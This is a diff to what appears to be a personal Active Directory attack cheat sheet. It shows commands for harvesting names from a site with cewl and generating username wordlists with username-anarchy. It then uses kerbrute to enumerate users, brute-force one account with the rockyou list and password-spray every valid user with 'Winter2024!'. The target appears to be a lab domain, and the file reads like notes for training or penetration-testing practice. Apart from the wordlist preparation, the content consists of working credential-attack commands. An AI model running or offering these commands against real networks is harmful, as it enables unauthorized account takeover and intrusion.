@@ -6,6 +6,8 @@ cewl https://target.com --email | cut -d@ -f1 > first_last-name.txt
 # Valid Username Wordlist Generator
 cat first_last-name.txt | sort -u | sed '/^$/d' > clean_names.txt
 ruby username-anarchy -i clean_names.txt > users_wordlist
+ruby username-anarchy -i clean_names.txt --select-format first.last > users_wordlist2
+ruby username-anarchy -i clean_names.txt --select-format firstlast >> users_wordlist2
 ```
 
 # Email Wordlist
@@ -78,7 +80,10 @@ cat mut_password.list | awk 'length($0) >= 8 && length($0) <= 20' > final.list
 ./kerbrute userenum --dc 192.168.0.239 -d warzone.oxsium.local /home/sako/Special-Tools/Active-Directory/username-anarchy/users_wordlist
 
 # Password Brute Force
-./kerbrute bruteuser --dc 192.168.0.239 -d warzone.oxsium.local /usr/share/wordlists/rockyou.txt jkimmich 
+./kerbrute bruteuser --dc 192.168.0.239 -d warzone.oxsium.local /usr/share/wordlists/rockyou.txt jkimmich
+
+# All User brute Force
+./kerbrute passwordspray --dc 192.168.0.239 -d warzone.oxsium.local valid_users.txt 'Winter2024!'
 ```
 
 
